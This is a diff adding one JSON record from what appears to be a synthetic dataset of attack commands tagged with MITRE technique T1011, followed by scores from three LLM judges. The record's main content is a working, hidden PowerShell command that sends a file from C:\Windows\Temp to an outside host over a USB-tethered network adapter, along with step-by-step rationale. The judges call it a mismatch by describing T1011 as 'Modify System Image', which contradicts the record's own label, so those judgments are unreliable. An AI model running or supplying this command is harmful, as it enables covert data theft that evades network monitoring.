@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Uses WMIC to invoke PowerShell that binds to a USB tethering (Remote NDIS) adapter and exfiltrates a file to an external host using a high TCP port. This exploits a USB-backed network path distinct from the primary NIC.",
+  "rationale_steps": [
+    "Detect a USB tethering NIC via its Remote NDIS description.",
+    "Bind the TCP client to that interface to force egress over USB tether.",
+    "Connect to an uncommon port on the exfiltration server.",
+    "Send the selected file over the alternate network medium per T1011.",
+    "Refrain from system-level network configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-e65af2df",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax including variable declarations, method calls, and pipeline operations.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data which aligns with T1011 (Exfiltration Over Other Network Medium), it doesn't actually modify system firmware/images as described in the technique description, making it misaligned with the stated MITRE technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:06:20.507610Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct WMI syntax, proper PowerShell flags, balanced quotes and braces, and accurate escaping of PowerShell variables within the WMIC string.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs file exfiltration over a network connection, which is completely unrelated to 'Modify System Image' (T1011); it aligns more with exfiltration techniques like T1041 or T1048.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:06:31.369239Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed WMIC invocation with balanced quoting and valid PowerShell syntax/escapes, using proper separators and callable .NET methods.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs file exfiltration over a specific network interface, not any modification of firmware/bootloader or system image as described by the technique.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T18:07:49.485739Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
